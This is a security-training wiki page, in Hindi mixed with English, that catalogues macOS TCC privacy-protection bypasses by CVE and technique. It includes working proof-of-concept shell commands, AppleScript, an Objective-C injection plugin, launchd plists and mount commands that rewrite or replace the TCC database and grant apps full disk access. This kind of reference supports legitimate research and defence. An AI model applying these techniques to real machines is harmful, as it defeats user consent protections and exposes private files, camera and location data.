# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## functionality के अनुसार

### Write Bypass

यह कोई bypass नहीं है, यह केवल TCC के काम करने का तरीका है: **यह writing से सुरक्षा नहीं करता**। यदि Terminal **के पास किसी user के Desktop को read करने की access नहीं है, तो भी वह उसमें write कर सकता है**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
नए **file** में **extended attribute `com.apple.macl`** जोड़ा जाता है, ताकि **creators app** को उसे पढ़ने की access मिल सके।

### TCC ClickJacking

उपयोगकर्ता को इसका पता चले बिना उसे इसे **accept** करवाने के लिए **TCC prompt के ऊपर एक window रखना** संभव है। आप इसका PoC [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** में पा सकते हैं।**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Attacker **किसी भी नाम** (जैसे Finder, Google Chrome...) से **apps create** कर सकता है और **`Info.plist`** में उस नाम का उपयोग करके किसी TCC protected location की access request कर सकता है। User समझेगा कि legit application ही इस access की request कर रही है।\
इसके अलावा, **legit app को Dock से remove करके उसकी जगह fake app रखना** संभव है। इसलिए जब user fake app पर click करता है (जो उसी icon का उपयोग कर सकती है), तो यह legit app को call कर सकती है, TCC permissions मांग सकती है और malware execute कर सकती है। इससे user को लगेगा कि legit app ने access request की है।

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

अधिक जानकारी और PoC यहाँ हैं:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

By default **SSH के माध्यम से access में "Full Disk Access" हुआ करता था**। इसे disable करने के लिए इसे list में मौजूद लेकिन disabled रखना आवश्यक है (इसे list से remove करने पर वे privileges remove नहीं होंगे):

![TCC Request by arbitrary name - SSH Bypass: By default SSH के माध्यम से access में "Full Disk Access" हुआ करता था। इसे disable करने के लिए इसे list में मौजूद लेकिन disabled रखना आवश्यक है (इसे list से...](<../../../../../images/image (1077).png>)

यहाँ कुछ **malwares द्वारा इस protection को bypass करने** के examples मिल सकते हैं:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> ध्यान दें कि अब SSH को enable करने के लिए **Full Disk Access** आवश्यक है।

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** attribute files को दिया जाता है, ताकि **किसी निश्चित application को उसे पढ़ने की permissions मिल सकें।** यह attribute तब set होता है जब किसी file को किसी app पर **drag\&drop** किया जाता है, या जब user किसी file को खोलने के लिए उस पर **double-clicks** करता है और वह **default application** से open होती है।

इसलिए, user सभी extensions को handle करने के लिए **malicious app register** कर सकता है और किसी भी file को **open** करने के लिए Launch Services को call कर सकता है (जिससे malicious file को उसे पढ़ने की access मिल जाएगी)।

### iCloud

**`com.apple.private.icloud-account-access`** entitlement के माध्यम से **`com.apple.iCloudHelper`** XPC service से communicate करना संभव है, जो **iCloud tokens provide** करेगा।

**iMovie** और **Garageband** के पास यह entitlement और अन्य अनुमतियाँ थीं।

उस entitlement से **icloud tokens प्राप्त करने** वाले exploit के बारे में अधिक **information** के लिए यह talk देखें: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** permission वाली app अन्य **Apps को control** कर सकेगी। इसका अर्थ है कि वह अन्य Apps को दी गई **permissions का abuse** कर सकती है।

Apple Scripts के बारे में अधिक जानकारी के लिए देखें:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

उदाहरण के लिए, यदि किसी App के पास **`iTerm` पर Automation permission** है, तो इस example में **`Terminal`** के पास iTerm की access है:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, जिसके पास FDA नहीं है, iTerm को call कर सकता है, जिसके पास FDA है, और उसका उपयोग करके actions perform कर सकता है:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder के माध्यम से

या यदि किसी App के पास Finder के माध्यम से access है, तो यह इस जैसी script हो सकती है:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## App के व्यवहार के अनुसार

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Userland **tccd daemon** **`HOME`** **env** variable का उपयोग इस स्थान से TCC users database को access करने के लिए कर रहा था: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[इस Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) के अनुसार, और क्योंकि TCC daemon वर्तमान user के domain के भीतर `launchd` के माध्यम से चल रहा है, इसलिए उसे पास किए जाने वाले **सभी environment variables को control करना** संभव है।\
इस प्रकार, एक **attacker `launchctl` में `$HOME` environment** variable को किसी **controlled** **directory** की ओर point कर सकता है, **TCC** daemon को **restart** कर सकता है, और फिर **TCC database को सीधे modify** करके बिना end user को कभी prompt किए स्वयं को उपलब्ध **हर TCC entitlement** दे सकता है।\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes को TCC protected locations तक access प्राप्त था, लेकिन जब कोई note बनाया जाता है, तो यह **non-protected location में बनाया जाता है**। इसलिए, आप Notes से किसी protected file को किसी note में copy करने के लिए कह सकते थे (अर्थात non-protected location में) और फिर उस file तक access कर सकते थे:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` library वाली binary `/usr/libexec/lsd` के पास `com.apple.private.nullfs_allow` entitlement था, जो उसे **nullfs** mount बनाने की अनुमति देता था। इसके पास **`kTCCServiceSystemPolicyAllFiles`** के साथ `com.apple.private.tcc.allow` entitlement भी था, जिससे वह हर file तक access कर सकती थी।

"Library" में quarantine attribute जोड़ना, **`com.apple.security.translocation`** XPC service को call करना और फिर Library को **`$TMPDIR/AppTranslocation/d/d/Library`** पर map करना संभव था, जहाँ Library के अंदर मौजूद सभी documents को **access** किया जा सकता था।

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** में एक interesting feature है: जब यह चल रहा होता है, तो यह **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** में drop की गई files को user's "media library" में **import** कर देता है। इसके अलावा, यह कुछ इस तरह call करता है: **`rename(a, b);`** जहाँ `a` और `b` ये हैं:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

यह **`rename(a, b);`** behaviour एक **Race Condition** के प्रति vulnerable है, क्योंकि `Automatically Add to Music.localized` folder के अंदर एक fake **TCC.db** file रखना संभव है और फिर जब नई folder (b) बनाई जाती है, तो file को copy करके, उसे delete कर और उसे **`~/Library/Application Support/com.apple.TCC`**/ पर point करना संभव है।  
**अधिक जानकारी** [**writeup में**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)

### SQLITE_SQLLOG_DIR - CVE-2023-32422

यदि **`SQLITE_SQLLOG_DIR="path/folder"`** set किया गया हो, तो इसका मूल अर्थ है कि **any open db को उस path पर copy किया जाता है**। इस CVE में इस control का abuse करके एक **SQLite database** के अंदर **write** किया गया, जिसे FDA वाले process द्वारा TCC database के रूप में **open** किया जाना था। इसके बाद filename में **symlink** के साथ **`SQLITE_SQLLOG_DIR`** का abuse किया गया, ताकि जब वह database **open** हो, तो user का **TCC.db opened database से overwrite** हो जाए।\
**अधिक जानकारी** [**writeup में**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **और**[ **talk में**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s)।

### **SQLITE_AUTO_TRACE**

यदि environment variable **`SQLITE_AUTO_TRACE`** set किया गया हो, तो library **`libsqlite3.dylib`** सभी SQL queries की **logging** शुरू कर देगी। कई applications इस library का उपयोग करती थीं, इसलिए उनकी सभी SQLite queries को log करना संभव था।

कई Apple applications ने TCC protected information तक access करने के लिए इस library का उपयोग किया।
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

यह **env variable `Metal` framework द्वारा उपयोग किया जाता है**, जो विभिन्न programs की dependency है, विशेष रूप से `Music`, जिसके पास FDA है।

निम्न सेट करने पर: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`। यदि `path` एक valid directory है, तो bug trigger होगा और हम program में क्या हो रहा है यह देखने के लिए `fs_usage` का उपयोग कर सकते हैं:

- एक file `open()` की जाएगी, जिसका नाम `path/.dat.nosyncXXXX.XXXXXX` होगा (X random है)
- एक या अधिक `write()`s file में contents लिखेंगे (इसे हम control नहीं करते)
- `path/.dat.nosyncXXXX.XXXXXX` को `path/name` पर `rename()` किया जाएगा

यह एक temporary file write है, जिसके बाद **`rename(old, new)`** होता है, **जो secure नहीं है।**

यह secure नहीं है क्योंकि इसे old और new paths को अलग-अलग **resolve करना पड़ता है**, जिसमें कुछ समय लग सकता है और यह Race Condition के प्रति vulnerable हो सकता है। अधिक जानकारी के लिए आप `xnu` function `renameat_internal()` देख सकते हैं।

> [!CAUTION]
> मूल रूप से, यदि कोई privileged process आपके control वाले folder से rename कर रहा है, तो आप RCE जीत सकते हैं और उससे किसी अलग file को access करवा सकते हैं या, इस CVE की तरह, privileged app द्वारा बनाई गई file को open करके एक FD store कर सकते हैं।
>
> यदि rename आपके control वाले folder को access करता है, और आपने source file को modify किया है या उसके पास FD है, तो आप destination file (या folder) को बदलकर symlink की ओर point करा सकते हैं, जिससे आप जब चाहें write कर सकें।

CVE में यही attack किया गया था। उदाहरण के लिए, user की `TCC.db` overwrite करने के लिए हम:

- `/Users/hacker/ourlink` बनाकर उसे `/Users/hacker/Library/Application Support/com.apple.TCC/` की ओर point कराते हैं
- directory `/Users/hacker/tmp/` बनाते हैं
- `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` set करते हैं
- इस env var के साथ `Music` चलाकर bug trigger करते हैं
- `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` के `open()` को catch करते हैं (X random है)
- यहां हम इस file को writing के लिए `open()` भी करते हैं और file descriptor को hold करके रखते हैं
- `/Users/hacker/tmp` और `/Users/hacker/ourlink` को **एक loop में atomically switch** करते हैं
- race window काफी छोटी होने के कारण अपनी सफलता की संभावना बढ़ाने के लिए हम ऐसा करते हैं, लेकिन race हारने का downside नगण्य है
- थोड़ा wait करते हैं
- check करते हैं कि हम lucky रहे या नहीं
- यदि नहीं, तो शुरुआत से फिर run करते हैं

अधिक जानकारी [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html) में है।

> [!CAUTION]
> अब, यदि आप `MTL_DUMP_PIPELINES_TO_JSON_FILE` env variable का उपयोग करने का प्रयास करते हैं, तो apps launch नहीं होंगे।

### Apple Remote Desktop

root के रूप में आप इस service को enable कर सकते हैं और **ARD agent के पास full disk access होगा**, जिसका बाद में user द्वारा एक नया **TCC user database** copy करवाने के लिए abuse किया जा सकता है।

## By **NFSHomeDirectory**

TCC user के HOME folder में database का उपयोग करके user-specific resources तक access control करता है: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**।\
इसलिए, यदि user TCC को ऐसे `$HOME` env variable के साथ restart करवा पाता है जो **किसी अलग folder** की ओर point करता है, तो user **/Library/Application Support/com.apple.TCC/TCC.db** में एक नया TCC database बना सकता है और TCC को किसी भी app को कोई भी TCC permission grant करने के लिए trick कर सकता है।

> [!TIP]
> ध्यान दें कि Apple user के profile में stored setting के **`NFSHomeDirectory`** attribute का उपयोग **`$HOME` के value** के रूप में करता है। इसलिए, यदि आप ऐसी application compromise करते हैं जिसके पास इस value को modify करने की permissions हैं (**`kTCCServiceSystemPolicySysAdminFiles`**), तो आप TCC bypass के साथ इस option को **weaponize** कर सकते हैं।

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**पहला POC** user के **HOME** folder को modify करने के लिए [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) और [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) का उपयोग करता है।

1. Target app के लिए एक _csreq_ blob प्राप्त करें।
2. Required access और _csreq_ blob के साथ एक fake _TCC.db_ file plant करें।
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) के साथ user की Directory Services entry export करें।
4. User की home directory बदलने के लिए Directory Services entry modify करें।
5. Modified Directory Services entry को [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) के साथ import करें।
6. User के _tccd_ को stop करें और process को reboot करें।

दूसरे POC में **`/usr/libexec/configd`** का उपयोग किया गया, जिसके पास `com.apple.private.tcc.allow` में `kTCCServiceSystemPolicySysAdminFiles` value थी।\
`configd` को **`-t`** option के साथ run करना संभव था, जिससे attacker **एक custom Bundle load करने के लिए specify कर सकता था**। इसलिए exploit user की home directory बदलने के लिए **`dsexport`** और **`dsimport`** method को **`configd` code injection** से replace करता है।

अधिक जानकारी के लिए [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) देखें।

## By process injection

किसी process के अंदर code inject करने और उसके TCC privileges का abuse करने के लिए अलग-अलग techniques हैं:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

इसके अलावा, TCC bypass करने के लिए सबसे common process injection **plugins (load library)** के माध्यम से पाया जाता है।\
Plugins extra code होते हैं, आमतौर पर libraries या plist के रूप में, जिन्हें **main application द्वारा load किया जाता है** और जो उसके context में execute होते हैं। इसलिए, यदि main application के पास TCC-restricted files का access था (granted permissions या entitlements के माध्यम से), तो **custom code के पास भी वही access होगा**।

### CVE-2020-27937 - Directory Utility

Application `/System/Library/CoreServices/Applications/Directory Utility.app` के पास **`kTCCServiceSystemPolicySysAdminFiles`** entitlement था, यह **`.daplug`** extension वाले plugins load करती थी और इसमें **hardened** runtime नहीं था।

इस CVE को weaponize करने के लिए, **`NFSHomeDirectory`** को बदला जाता है (पिछले entitlement का abuse करके), ताकि TCC bypass करने के लिए **user के TCC database पर control लिया जा सके**।

अधिक जानकारी के लिए [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) देखें।

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** के पास `com.apple.security.cs.disable-library-validation` और `com.apple.private.tcc.manager` entitlements थे। पहला **code injection की अनुमति देता था** और दूसरा इसे **TCC manage करने का access देता था**।

यह binary `/Library/Audio/Plug-Ins/HAL` folder से **third party plug-ins** load करने की अनुमति देती थी। इसलिए, इस POC के साथ **एक plugin load करना और TCC permissions का abuse करना** संभव था:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
अधिक जानकारी के लिए [**मूल रिपोर्ट**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) देखें।

### Device Abstraction Layer (DAL) Plug-Ins

वे System applications जो Core Media I/O के माध्यम से camera stream खोलते हैं (जिनमें **`kTCCServiceCamera`** होता है), वे इस process में `/Library/CoreMediaIO/Plug-Ins/DAL` में स्थित plugins को load करते हैं (यह SIP restricted नहीं है)।

वहां केवल common **constructor** वाली library store करने से **code inject** करना संभव है।

कई Apple applications इसके प्रति vulnerable थीं।

### Firefox

Firefox application में `com.apple.security.cs.disable-library-validation` और `com.apple.security.cs.allow-dyld-environment-variables` entitlements थे:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
TCC privileges का आसानी से exploit करने की अधिक जानकारी के लिए [**original report देखें**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)।

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` के पास entitlements **`com.apple.private.tcc.allow`** और **`com.apple.security.get-task-allow`** थे, जिनकी मदद से process के अंदर code inject करना और TCC privileges का उपयोग करना संभव था।

### CVE-2023-26818 - Telegram

Telegram के पास entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** और **`com.apple.security.cs.disable-library-validation`** थे, इसलिए इसके permissions का access प्राप्त करने के लिए इसका abuse करना संभव था, जैसे camera से recording करना। आप [**writeup में payload पा सकते हैं**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)।

ध्यान दें कि library load करने के लिए env variable का उपयोग कैसे किया गया: इस library को inject करने के लिए एक **custom plist** बनाई गई और उसे launch करने के लिए **`launchctl`** का उपयोग किया गया:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## `open` invocations द्वारा

sandboxed होने पर भी **`open`** को invoke करना संभव है

### Terminal Scripts

तकनीकी लोगों द्वारा उपयोग किए जाने वाले computers में Terminal को **Full Disk Access (FDA)** देना काफी आम है। और इसके साथ **`.terminal`** scripts को invoke करना संभव है।

**`.terminal`** scripts plist files होती हैं, जैसे यह file, जिसमें execute की जाने वाली command **`CommandString`** key में होती है:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
एक application /tmp जैसी location में terminal script लिख सकता है और उसे निम्नलिखित command के साथ launch कर सकता है:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**कोई भी user** (यहां तक कि unprivileged users भी) एक time machine snapshot बना और mount कर सकता है और उस snapshot की **सभी files तक access** प्राप्त कर सकता है।\
आवश्यक **एकमात्र privilege** यह है कि उपयोग किए गए application (जैसे `Terminal`) के पास **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) हो, जिसे किसी admin द्वारा grant किया जाना आवश्यक है।
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
[**मूल report में अधिक विस्तृत explanation मिल सकती है**](https://theevilbit.github.io/posts/cve_2020_9771/)**।**

### CVE-2021-1784 और CVE-2021-30808 - TCC file पर Mount

भले ही TCC DB file protected हो, फिर भी **directory पर mount करके** एक नई TCC.db file लगाना संभव था:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
**full exploit** को [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) में देखें।

### CVE-2024-40855

जैसा कि [original writeup](https://www.kandji.io/blog/macos-audit-story-part2) में बताया गया है, इस CVE ने `diskarbitrationd` का दुरुपयोग किया।

Public `DiskArbitration` framework का `DADiskMountWithArgumentsCommon` function security checks करता था। हालांकि, `diskarbitrationd` को सीधे call करके इसे bypass करना संभव था और इसलिए path में `../` elements और symlinks का उपयोग किया जा सकता था।

इससे attacker किसी भी location पर arbitrary mounts कर सकता था, जिसमें TCC database के ऊपर mount करना भी शामिल था, क्योंकि `diskarbitrationd` के पास `com.apple.private.security.storage-exempt.heritable` entitlement था।

### asr

Tool **`/usr/sbin/asr`** पूरे disk को copy करके किसी अन्य स्थान पर mount कर सकता था और TCC protections को bypass कर सकता था।

### Location Services

**location services** तक **access** की अनुमति वाले clients को दर्शाने के लिए **`/var/db/locationd/clients.plist`** में एक तीसरा TCC database मौजूद है।\
**`/var/db/locationd/` folder DMG mounting से protected नहीं था**, इसलिए हमारे स्वयं के plist को mount करना संभव था।

## Startup apps द्वारा


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep द्वारा

कई मामलों में files emails, phone numbers, messages... जैसी sensitive information को non protected locations में store करेंगी (जिसे Apple में vulnerability माना जाता है)।

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

यह अब काम नहीं करता, लेकिन [**did in the past**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) का उपयोग करने का एक अन्य तरीका:

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
